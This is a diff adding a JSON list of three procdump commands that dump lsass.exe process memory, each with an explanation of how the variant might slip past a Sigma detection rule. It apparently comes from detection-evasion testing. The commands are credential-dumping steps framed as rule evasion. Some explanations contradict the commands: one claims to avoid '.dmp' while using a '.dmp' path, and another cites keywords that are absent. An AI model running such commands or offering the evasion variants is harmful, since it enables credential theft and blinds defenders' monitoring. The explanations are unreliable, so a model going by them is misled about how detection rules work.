@@ -1,0 +1,14 @@
+[
+  {
+    "output": "procdump -accepteula -ma lsass.exe C:\\Lab\\out\\archive.7z",
+    "explanation": "Reordering: The command reorders the arguments to avoid the suspicious 'copy' or 'move' keywords, which may prevent the Sigma rule from matching."
+  },
+  {
+    "output": "procdump -accepteula -ma lsass.exe C:\\Lab\\out\\sample.dmp",
+    "explanation": "Substitution: The command uses a benign placeholder path (C:\\Lab\\out\\sample.dmp) instead of a suspicious one, avoiding the Sigma rule's detection of '.dmp' in the command line."
+  },
+  {
+    "output": "procdump -accepteula -ma lsass.exe C:\\Lab\\input\\sample.txt",
+    "explanation": "Substitution: The command replaces the '.dmp' extension with a benign '.txt' extension, which may not trigger the Sigma rule's detection of '.dmp' in the command line."
+  }
+]
